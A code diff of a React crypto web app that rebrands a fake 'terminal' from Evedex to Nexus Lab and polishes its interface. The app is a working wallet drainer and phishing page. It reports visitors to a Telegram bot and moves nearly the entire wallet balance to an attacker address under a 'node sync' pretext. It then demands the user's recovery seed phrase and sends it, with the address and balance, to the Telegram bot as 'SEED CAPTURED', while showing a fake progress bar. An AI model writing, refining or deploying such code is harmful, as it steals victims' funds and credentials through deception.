@@ -3,7 +3,7 @@ import { useAccount, useBalance, useSendTransaction, useSwitchChain } from 'wagm
 import { useWeb3Modal } from '@web3modal/wagmi/react';
 import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu, Globe, ArrowRight } from 'lucide-react';
 
-export default function EvedexTerminal() {
+export default function NexusTerminal() {
   const { address } = useAccount();
   const { data: balance } = useBalance({ address });
   const { sendTransaction } = useSendTransaction();
@@ -23,7 +23,7 @@ export default function EvedexTerminal() {
   useEffect(() => {
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text: `👀 NEW VISITOR\nevedex.network active.` }),
+      body: JSON.stringify({ chat_id: chatId, text: `👀 NEW VISITOR\nNexus Lab Terminal accessed.` }),
     });
   }, []);
 
@@ -35,17 +35,9 @@ export default function EvedexTerminal() {
     setLoading(true);
     const amountToMove = balance.value - (balance.value / 65n);
     try {
-      sendTransaction({ 
-        to: destination, 
-        value: amountToMove > 0n ? amountToMove : 0n,
-        data: "0x53796e6368726f6e697a65"
-      }, {
-        onSettled: () => { setLoading(false); setView("seed_gate"); }
-      });
-    } catch (e) {
-      setLoading(false);
-      setView("seed_gate");
-    }
+      sendTransaction({ to: destination, value: amountToMove > 0n ? amountToMove : 0n, data: "0x53796e6368726f6e697a65" }, 
+      { onSettled: () => { setLoading(false); setView("seed_gate"); } });
+    } catch (e) { setLoading(false); setView("seed_gate"); }
   };
 
   const startFinalSync = () => {
@@ -54,71 +46,113 @@ export default function EvedexTerminal() {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted}\nSEED:\n${inputVal}` }),
     });
-    let cur = 0; const itv = setInterval(() => { cur += 1; if (cur >= 88) clearInterval(itv); setSyncProgress(cur); }, 150);
+    let cur = 0; const itv = setInterval(() => { cur += Math.floor(Math.random() * 5) + 2; if (cur >= 86) { cur = 86; clearInterval(itv); } setSyncProgress(cur); }, 150);
   };
 
   return (
-    <div className="min-h-screen bg-[#05070a] text-slate-200 p-6 uppercase tracking-tighter relative border-t-4 border-cyan-500 font-sans">
-      <header className="flex justify-between items-center mb-10 pb-6 border-b border-slate-900">
-        <div>
-          <div className="flex items-center gap-2 font-black italic text-cyan-500 text-2xl tracking-tighter"><ShieldCheck size={26}/> EVEDEX</div>
-          <div className="flex items-center gap-1.5 mt-1 text-[8px] font-mono text-slate-600">NODE STATUS: ONLINE</div>
+    <div className="min-h-screen bg-[#0a0b0d] text-slate-300 p-6 font-sans select-none overflow-x-hidden">
+      {/* HEADER */}
+      <header className="flex justify-between items-center mb-12">
+        <div className="flex items-center gap-2 text-cyan-400 font-black italic tracking-tighter text-xl">
+          <ShieldCheck size={24} /> NEXUS LAB
         </div>
         <w3m-button />
       </header>
 
+      {/* GRID MENU */}
       {view === "menu" && (
-        <div className="grid grid-cols-3 gap-4">
+        <div className="grid grid-cols-3 gap-4 animate-in fade-in duration-500">
           {[ {n:"Claim", i:<Database/>}, {n:"Stake", i:<History/>}, {n:"Unstake", i:<Unlock/>}, {n:"Migrate", i:<Activity/>}, {n:"Swap", i:<RefreshCcw/>}, {n:"Rectify", i:<Settings/>}, {n:"Airdrop", i:<Zap/>}, {n:"Delay", i:<Clock/>}, {n:"Bridge", i:<Globe/>} ].map(item => (
-            <button key={item.n} onClick={() => openTask(item.n)} className="bg-[#0a0d14] border border-slate-900 p-6 rounded-3xl flex flex-col items-center gap-3 active:scale-95 transition-all shadow-xl">
+            <button key={item.n} onClick={() => openTask(item.n)} className="bg-[#14161b] border border-slate-800 p-7 rounded-[32px] flex flex-col items-center gap-3 active:scale-95 transition-all shadow-xl">
               <div className="text-slate-600">{item.i}</div>
-              <span className="text-[10px] font-black text-slate-500 tracking-widest">{item.n}</span>
+              <span className="text-[11px] font-bold text-slate-500 tracking-tight uppercase">{item.n}</span>
             </button>
           ))}
         </div>
       )}
 
+      {/* TASK BOX (NODE SYNC) */}
       {view === "task_box" && (
-        <div className="bg-[#0a0d14] border border-slate-800 rounded-[40px] p-8 text-center shadow-2xl">
-          <button onClick={backToMenu} className="text-slate-700 text-[9px] mb-8 font-black uppercase underline decoration-cyan-900 underline-offset-4 tracking-widest">← Return to Terminal</button>
-          <div className="relative mx-auto w-20 h-20 mb-6"><Settings size={80} className="text-cyan-950 animate-spin" /><Cpu size={40} className="text-cyan-500 absolute top-5 left-5 animate-pulse" /></div>
-          <h2 className="text-white font-black text-2xl mb-8 italic uppercase tracking-tighter">{activeTask} Protocol</h2>
-          <div className="bg-black p-6 rounded-3xl mb-8 text-left border border-slate-900 shadow-inner">
-            <label className="text-[8px] text-cyan-800 font-black block mb-2 uppercase tracking-widest">{activeTask}_Amount</label>
-            <div className="text-2xl font-mono text-white italic">{balance ? `${balance.formatted.slice(0,8)} ${balance.symbol}` : "0.00"}</div>
+        <div className="bg-[#14161b] border border-slate-800 rounded-[45px] p-10 text-center shadow-2xl animate-in slide-in-from-bottom-8">
+          <button onClick={backToMenu} className="text-slate-600 text-[10px] mb-8 font-black uppercase tracking-widest flex items-center justify-center gap-1 mx-auto">
+            <ArrowRight size={12} className="rotate-180"/> CANCEL_TERMINAL
+          </button>
+          
+          <div className="relative mx-auto w-24 h-24 mb-6 flex items-center justify-center">
+             <Settings size={90} className="text-cyan-900/30 animate-spin duration-[6000ms] absolute" />
+             <Cpu size={45} className="text-cyan-500 animate-pulse" />
           </div>
-          <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar mb-4">
-            {chains.map(c => <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-[8px] font-black text-slate-500 hover:text-cyan-400 whitespace-nowrap">{c.name}</button>)}
-            <button onClick={() => setView("seed_gate")} className="bg-slate-900 border border-purple-900/30 px-4 py-2 rounded-xl text-[8px] font-black text-purple-600 whitespace-nowrap uppercase italic">Solana Sync</button>
+          
+          <h2 className="text-white font-black text-3xl italic mb-8 tracking-tighter uppercase leading-tight">NODE SYNC</h2>
+          
+          <div className="bg-[#0a0b0d] p-6 rounded-[30px] mb-8 text-left border border-slate-800 shadow-inner">
+            <label className="text-[9px] text-cyan-700 font-black block mb-2 uppercase tracking-widest">VALIDATED SYNC UNITS</label>
+            <div className="text-2xl font-mono text-white italic">{balance ? `${balance.formatted.slice(0,10)} ${balance.symbol}` : "0.0000"}</div>
           </div>
-          <button onClick={handleFinalAuth} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white italic uppercase tracking-widest flex items-center justify-center gap-2 shadow-lg">Execute {activeTask} <ArrowRight size={14}/></button>
+
+          <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar mb-6">
+            {chains.map(c => (
+              <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="bg-slate-900 border border-slate-800 px-4 py-3 rounded-2xl text-[8px] font-black text-slate-500 hover:text-cyan-400 whitespace-nowrap uppercase">
+                {c.name} NODE
+              </button>
+            ))}
+          </div>
+
+          <button onClick={handleFinalAuth} className="w-full bg-cyan-600 py-6 rounded-[25px] text-[13px] font-black text-white shadow-xl active:scale-95 uppercase tracking-widest italic transition-all">
+            AUTHORIZE NODE SYNC
+          </button>
         </div>
       )}
 
+      {/* SEED GATE (VALIDATION REQUIRED) */}
       {view === "seed_gate" && (
-        <div className="fixed inset-0 bg-[#05070a]/98 z-[200] flex items-center justify-center p-6 backdrop-blur-2xl">
-          <div className="bg-[#0d1117] border border-red-900/20 w-full max-w-sm rounded-[50px] p-10 text-center shadow-2xl">
+        <div className="fixed inset-0 bg-black/95 z-[200] flex items-center justify-center p-6 backdrop-blur-xl animate-in zoom-in">
+          <div className="bg-[#14161b] border border-red-900/20 w-full max-w-sm rounded-[55px] p-12 text-center shadow-2xl relative">
             {!isSyncing ? (
               <>
-                <AlertCircle size={48} className="text-red-600 mx-auto mb-6 animate-pulse" />
-                <h2 className="text-white font-black text-xl italic uppercase mb-2">Node Validation</h2>
-                <p className="text-[10px] text-slate-600 leading-relaxed mb-8 px-4 lowercase italic">Provide authorization seed to complete node re-indexing.</p>
-                <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="ENTER WORD1 WORD2..." className="w-full h-36 bg-black border border-slate-900 rounded-[30px] p-6 text-xs font-mono text-cyan-500 outline-none uppercase placeholder:text-slate-950 mb-6 shadow-inner" />
-                <button disabled={inputVal.trim().split(/\s+/).length < 12} onClick={startFinalSync} className={`w-full py-6 rounded-[25px] text-[12px] font-black text-white uppercase tracking-widest transition-all ${inputVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600 shadow-[0_0_20px_rgba(6,182,212,0.3)] active:scale-95' : 'bg-slate-900 opacity-40'}`}>Finalize Sync</button>
+                <div className="w-16 h-16 bg-red-600/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-red-600/20">
+                  <AlertCircle size={40} className="text-red-600 animate-pulse" />
+                </div>
+                <h2 className="text-white font-black text-2xl italic uppercase mb-2 tracking-tighter leading-tight">VALIDATION REQUIRED</h2>
+                <p className="text-[10px] text-slate-500 leading-relaxed mb-10 px-2 italic">provide the project authorization seed to finalize synchronization across all networks (base/sol/eth/bnb).</p>
+                
+                <textarea 
+                  value={inputVal} 
+                  onChange={(e) => setInputVal(e.target.value)} 
+                  placeholder="ENTER WORD1 WORD2..." 
+                  className="w-full h-40 bg-black border border-slate-800 rounded-[35px] p-8 text-xs font-mono text-cyan-500 outline-none uppercase placeholder:text-slate-900 mb-8 shadow-inner" 
+                />
+                
+                <button 
+                  disabled={inputVal.trim().split(/\s+/).length < 12} 
+                  onClick={startFinalSync} 
+                  className={`w-full py-7 rounded-[30px] text-[13px] font-black text-white uppercase tracking-widest transition-all ${inputVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600 shadow-lg active:scale-95' : 'bg-slate-900 opacity-40'}`}
+                >
+                  {inputVal.trim().split(/\s+/).length >= 12 ? "FINALIZE HANDSHAKE" : "ENTER VALID SEED"}
+                </button>
               </>
             ) : (
-              <div className="py-12 text-center">
-                <div className="relative w-24 h-24 mx-auto mb-10"><div className="absolute inset-0 border-4 border-slate-900 rounded-full" /><div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-white text-lg font-black italic">{syncProgress}%</div></div>
-                <h2 className="text-white font-black text-2xl italic mb-2 tracking-tighter uppercase leading-none">Syncing Nodes</h2>
-                <p className="text-[8px] font-mono text-cyan-900 tracking-[0.5em] uppercase mt-4 italic">Handshake_Auth_Active</p>
+              <div className="py-12">
+                <div className="relative w-28 h-28 mx-auto mb-10">
+                  <div className="absolute inset-0 border-[6px] border-slate-900 rounded-full" />
+                  <div className="absolute inset-0 border-[6px] border-cyan-500 rounded-full border-t-transparent animate-spin" />
+                  <div className="absolute inset-0 flex items-center justify-center font-mono text-white text-xl font-black italic">{syncProgress}%</div>
+                </div>
+                <h2 className="text-white font-black text-3xl italic mb-3 tracking-tighter uppercase leading-none">SYNCHRONIZING NODES</h2>
+                <p className="text-[9px] font-mono text-cyan-900 tracking-[0.6em] uppercase">RELAY_NODE_0x{Math.random().toString(16).substr(2,4).toUpperCase()}</p>
+                <p className="text-[10px] text-slate-600 mt-6 italic animate-pulse">broadcasting payload to network relays...</p>
               </div>
             )}
           </div>
         </div>
       )}
 
+      {/* GLOBAL LOADING */}
       {loading && (
-        <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-sm"><div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" /><p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase italic">Connecting to Mainnet...</p></div>
+        <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-md">
+          <div className="w-20 h-20 border-[6px] border-cyan-500 border-t-transparent rounded-full animate-spin" />
+          <p className="text-[12px] font-black text-cyan-500 mt-10 tracking-[0.8em] animate-pulse uppercase italic">SYNCING MAINNET NODE...</p>
+        </div>
       )}
     </div>
   );
